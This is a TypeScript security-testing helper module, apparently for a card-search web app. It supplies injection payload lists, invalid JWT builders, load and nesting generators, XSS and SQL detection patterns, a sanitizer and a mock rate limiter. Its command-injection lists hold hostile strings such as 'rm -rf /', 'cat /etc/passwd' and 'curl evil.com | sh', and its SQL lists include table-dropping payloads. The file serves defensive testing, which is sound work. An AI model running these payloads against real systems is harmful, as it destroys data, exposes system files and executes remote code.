/**
 * Security testing utilities and shared helpers.
 * Central exports for security test infrastructure.
 * @module lib/security
 */

import { vi } from 'vitest';

// ============================================================================
// Security Test Constants
// ============================================================================

export const SECURITY_LIMITS = {
  /** Maximum query length in characters */
  MAX_QUERY_LENGTH: 500,
  /** Maximum number of search parameters */
  MAX_PARAMS: 15,
  /** IP-based rate limit per minute */
  IP_RATE_LIMIT: 30,
  /** Session-based rate limit per minute */
  SESSION_RATE_LIMIT: 20,
  /** Global rate limit per minute */
  GLOBAL_RATE_LIMIT: 1000,
  /** Rate limit window in milliseconds */
  RATE_LIMIT_WINDOW_MS: 60000,
  /** Maximum JSON nesting depth */
  MAX_JSON_DEPTH: 10,
  /** Minimum alphanumeric ratio for valid input */
  MIN_ALPHANUMERIC_RATIO: 0.5,
  /** Maximum consecutive repeated characters */
  MAX_REPEATED_CHARS: 5,
} as const;

// ============================================================================
// Malicious Query Builders
// ============================================================================

/**
 * Build a malicious query string for testing injection prevention.
 */
export function buildMaliciousQuery(
  type: 'sql' | 'xss' | 'nosql' | 'command' | 'template',
): string {
  const payloads: Record<typeof type, string[]> = {
    sql: [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "1; SELECT * FROM cards; --",
      "' UNION SELECT * FROM auth.users --",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    ],
    xss: [
      '<script>alert(1)</script>',
      '<img onerror=alert(1) src=x>',
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '"><script>alert(1)</script>',
    ],
    nosql: [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$where": "this.password == this.password"}',
      '{"$regex": ".*"}',
    ],
    command: [
      '; rm -rf /',
      '| cat /etc/passwd',
      '`whoami`',
      '$(id)',
      '; curl evil.com | sh',
    ],
    template: [
      '{{constructor.constructor("return this")()}}',
      '${7*7}',
      '#{7*7}',
      '<%= 7*7 %>',
      '{{config}}',
    ],
  };

  // Return a random payload of the specified type
  const typePayloads = payloads[type];
  return typePayloads[Math.floor(Math.random() * typePayloads.length)];
}

/**
 * Get all payloads of a specific type for exhaustive testing.
 */
export function getAllMaliciousPayloads(
  type: 'sql' | 'xss' | 'nosql' | 'command' | 'template',
): string[] {
  const payloads: Record<typeof type, string[]> = {
    sql: [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "1; SELECT * FROM cards; --",
      "' UNION SELECT * FROM auth.users --",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      "admin'--",
      "' OR 1=1--",
      "'; TRUNCATE TABLE cards; --",
    ],
    xss: [
      '<script>alert(1)</script>',
      '<img onerror=alert(1) src=x>',
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '"><script>alert(1)</script>',
      '<a href="javascript:alert(1)">click</a>',
      '<div style="background:url(javascript:alert(1))">',
    ],
    nosql: [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$where": "this.password == this.password"}',
      '{"$regex": ".*"}',
      '{"$or": [{}]}',
    ],
    command: [
      '; rm -rf /',
      '| cat /etc/passwd',
      '`whoami`',
      '$(id)',
      '; curl evil.com | sh',
      '&& ls -la',
      '|| true',
    ],
    template: [
      '{{constructor.constructor("return this")()}}',
      '${7*7}',
      '#{7*7}',
      '<%= 7*7 %>',
      '{{config}}',
      '{{process.env}}',
    ],
  };
  return payloads[type];
}

// ============================================================================
// Token Builders
// ============================================================================

/**
 * Build an invalid JWT token for testing authentication.
 */
export function buildInvalidToken(
  type: 'expired' | 'malformed' | 'modified' | 'missing_claims' | 'wrong_issuer',
): string {
  const now = Math.floor(Date.now() / 1000);

  const tokens: Record<typeof type, string> = {
    expired: createMockJWT({
      iss: 'supabase',
      role: 'anon',
      exp: now - 3600, // Expired 1 hour ago
      iat: now - 7200,
    }),
    malformed: 'not.a.valid.jwt.token',
    modified: (() => {
      // Create a valid-looking token then tamper with it
      const base = createMockJWT({
        iss: 'supabase',
        role: 'service_role', // Elevated privileges
        exp: now + 3600,
        iat: now,
      });
      // Tamper with the payload (change last char)
      return base.slice(0, -1) + 'X';
    })(),
    missing_claims: createMockJWT({
      // Missing iss, role, exp
      iat: now,
    }),
    wrong_issuer: createMockJWT({
      iss: 'malicious-site',
      role: 'admin',
      exp: now + 3600,
      iat: now,
    }),
  };

  return tokens[type];
}

/**
 * Create a mock JWT token (unsigned, for testing only).
 */
export function createMockJWT(payload: Record<string, unknown>): string {
  const header = { alg: 'HS256', typ: 'JWT' };
  const headerB64 = btoa(JSON.stringify(header));
  const payloadB64 = btoa(JSON.stringify(payload));
  const signature = 'mock_signature_for_testing';
  return `${headerB64}.${payloadB64}.${signature}`;
}

// ============================================================================
// Payload Builders
// ============================================================================

/**
 * Build an oversized payload for testing payload limits.
 */
export function buildOversizedPayload(sizeKb: number): { query: string } {
  const chars = 'abcdefghijklmnopqrstuvwxyz ';
  const targetSize = sizeKb * 1024;
  let query = '';
  while (query.length < targetSize) {
    query += chars[Math.floor(Math.random() * chars.length)];
  }
  return { query };
}

/**
 * Build a deeply nested JSON object for testing JSON bomb protection.
 */
export function buildNestedObject(depth: number): Record<string, unknown> {
  if (depth <= 0) {
    return { value: 'leaf' };
  }
  return { nested: buildNestedObject(depth - 1) };
}

/**
 * Build a payload with circular reference potential.
 * Note: JSON.stringify will fail on actual circular refs, so this creates deep nesting.
 */
export function buildCircularLikePayload(): Record<string, unknown> {
  const obj: Record<string, unknown> = {};
  let current = obj;
  for (let i = 0; i < 100; i++) {
    current.next = {};
    current = current.next as Record<string, unknown>;
  }
  return obj;
}

// ============================================================================
// Concurrent Request Simulation
// ============================================================================

/**
 * Simulate concurrent requests for race condition testing.
 */
export async function simulateConcurrentRequests<T>(
  count: number,
  fn: () => Promise<T>,
): Promise<T[]> {
  const promises = Array.from({ length: count }, () => fn());
  return Promise.all(promises);
}

/**
 * Simulate rate-limited requests with timing.
 */
export async function simulateBurstRequests<T>(
  count: number,
  fn: (index: number) => Promise<T>,
  delayMs: number = 0,
): Promise<{ results: T[]; totalTimeMs: number }> {
  const start = Date.now();
  const results: T[] = [];

  for (let i = 0; i < count; i++) {
    results.push(await fn(i));
    if (delayMs > 0 && i < count - 1) {
      await new Promise((resolve) => setTimeout(resolve, delayMs));
    }
  }

  return { results, totalTimeMs: Date.now() - start };
}

// ============================================================================
// Validation Helpers
// ============================================================================

/**
 * Check if a string contains XSS payloads.
 */
export function containsXSS(input: string): boolean {
  const xssPatterns = [
    /<script[^>]*>/i,
    /javascript:/i,
    /on\w+\s*=/i, // onclick=, onerror=, etc.
    /<iframe/i,
    /<object/i,
    /<embed/i,
    /<svg[^>]*onload/i,
  ];
  return xssPatterns.some((pattern) => pattern.test(input));
}

/**
 * Check if a string contains SQL injection patterns.
 */
export function containsSQLInjection(input: string): boolean {
  const sqlPatterns = [
    /['";]\s*(OR|AND)\s+['"]?\d+['"]?\s*=\s*['"]?\d+/i,
    /['";]\s*--/,
    /UNION\s+(ALL\s+)?SELECT/i,
    /DROP\s+TABLE/i,
    /TRUNCATE\s+TABLE/i,
    /DELETE\s+FROM/i,
    /INSERT\s+INTO/i,
    /UPDATE\s+\w+\s+SET/i,
  ];
  return sqlPatterns.some((pattern) => pattern.test(input));
}

/**
 * Sanitize input by removing potentially dangerous characters.
 */
export function sanitizeInput(input: string): string {
  return input
    // Remove null bytes
    .replace(/\x00/g, '')
    // Remove control characters except newlines/tabs
    .replace(/[\x01-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '')
    // Remove zero-width characters
    .replace(/[\u200B-\u200D\uFEFF]/g, '')
    // Normalize whitespace
    .replace(/\s+/g, ' ')
    .trim();
}

/**
 * Check for repetitive character patterns (spam indicator).
 */
export function hasRepetitiveChars(input: string, threshold: number = 6): boolean {
  const pattern = new RegExp(`(.)\\1{${threshold - 1},}`);
  return pattern.test(input);
}

/**
 * Check if input has sufficient alphanumeric content.
 */
export function hasMinimumAlphanumeric(input: string, ratio: number = 0.5): boolean {
  if (input.length <= 10) return true; // Skip check for short inputs
  const alphanumericCount = (input.match(/[a-zA-Z0-9]/g) || []).length;
  return alphanumericCount >= input.length * ratio;
}

/**
 * Count search parameters in a Scryfall-style query.
 */
export function countQueryParameters(query: string): number {
  const matches = query.match(/\b[a-zA-Z]+[:=<>]/g) || [];
  return matches.length;
}

// ============================================================================
// Mock Response Types
// ============================================================================

export interface MockResponse {
  status: number;
  body?: unknown;
  headers?: Record<string, string>;
}

export interface RateLimitResult {
  allowed: boolean;
  retryAfter?: number;
}

export interface ValidationResult {
  valid: boolean;
  sanitized?: string;
  issues?: string[];
  rejected?: boolean;
  reason?: string;
}

// ============================================================================
// Mock Request Builders
// ============================================================================

/**
 * Build a mock request with specific headers.
 */
export function buildMockRequest(options: {
  method?: string;
  url?: string;
  headers?: Record<string, string>;
  body?: unknown;
}): {
  method: string;
  url: string;
  headers: { get: (key: string) => string | null };
  json: () => Promise<unknown>;
} {
  const headers = options.headers || {};
  return {
    method: options.method || 'POST',
    url: options.url || 'https://example.com/api',
    headers: {
      get: (key: string) => headers[key.toLowerCase()] || null,
    },
    json: async () => options.body,
  };
}

/**
 * Build a mock IP extraction function.
 */
export function extractClientIP(
  headers: { get: (key: string) => string | null },
  defaultIP: string = '127.0.0.1',
): string {
  // Check forwarded headers (use first IP only to prevent spoofing)
  const forwarded = headers.get('x-forwarded-for');
  if (forwarded) {
    const firstIP = forwarded.split(',')[0].trim();
    if (firstIP) return firstIP;
  }

  const realIP = headers.get('x-real-ip');
  if (realIP) return realIP;

  return defaultIP;
}

// ============================================================================
// Assertion Helpers
// ============================================================================

/**
 * Assert that a validation result indicates rejection.
 */
export function expectRejected(result: ValidationResult): void {
  if (result.valid && !result.rejected) {
    throw new Error(
      `Expected result to be rejected, but it was valid. Issues: ${result.issues?.join(', ')}`,
    );
  }
}

/**
 * Assert that input was sanitized correctly.
 */
export function expectSanitized(
  input: string,
  result: ValidationResult,
  shouldNotContain?: string[],
): void {
  if (!result.sanitized) {
    throw new Error('Expected sanitized output but got none');
  }

  if (shouldNotContain) {
    for (const forbidden of shouldNotContain) {
      if (result.sanitized.includes(forbidden)) {
        throw new Error(
          `Sanitized output should not contain "${forbidden}" but found it in "${result.sanitized}"`,
        );
      }
    }
  }
}

/**
 * Assert that a response indicates rate limiting.
 */
export function expectRateLimited(result: RateLimitResult): void {
  if (result.allowed) {
    throw new Error('Expected rate limiting but request was allowed');
  }
  if (result.retryAfter === undefined || result.retryAfter <= 0) {
    throw new Error('Expected positive retryAfter value');
  }
}

// ============================================================================
// Test Setup Helpers
// ============================================================================

/**
 * Create a mock rate limiter for testing.
 */
export function createMockRateLimiter(limit: number, windowMs: number) {
  const entries = new Map<string, { count: number; resetTime: number }>();

  return {
    check(key: string): RateLimitResult {
      const now = Date.now();
      const entry = entries.get(key);

      if (!entry || now > entry.resetTime) {
        entries.set(key, { count: 1, resetTime: now + windowMs });
        return { allowed: true };
      }

      if (entry.count >= limit) {
        return {
          allowed: false,
          retryAfter: Math.ceil((entry.resetTime - now) / 1000),
        };
      }

      entry.count++;
      return { allowed: true };
    },

    reset(key?: string): void {
      if (key) {
        entries.delete(key);
      } else {
        entries.clear();
      }
    },

    getCount(key: string): number {
      return entries.get(key)?.count || 0;
    },
  };
}

/**
 * Setup fetch mock for testing HTTP interactions.
 */
export function setupFetchMock(responses: Map<string, MockResponse>) {
  const mockFetch = vi.fn(async (url: string) => {
    const response = responses.get(url) || { status: 404, body: { error: 'Not found' } };
    return {
      ok: response.status >= 200 && response.status < 300,
      status: response.status,
      json: async () => response.body,
      text: async () => JSON.stringify(response.body),
      headers: new Map(Object.entries(response.headers || {})),
    };
  });

  return mockFetch;
}
